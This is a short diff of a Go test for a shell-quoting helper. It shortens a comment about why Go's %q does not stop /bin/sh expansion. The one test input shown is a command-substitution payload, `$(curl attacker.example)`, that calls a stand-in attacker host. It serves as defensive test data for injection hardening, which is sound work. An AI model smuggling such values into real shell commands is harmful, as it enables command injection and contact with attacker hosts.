@@ -9,8 +9,7 @@ import (
 )
 
 // The whole command string is handed to `/bin/sh -c`, so anything interpolated
-// into it is shell-evaluated. Go's %q was not enough: it quotes with double
-// quotes, inside which sh still expands $(...) and backticks.
+// into it is shell-evaluated.
 func TestShellQuoteNeutralisesShellSyntax(t *testing.T) {
 	for name, input := range map[string]string{
 		"command substitution": `$(curl attacker.example)`,
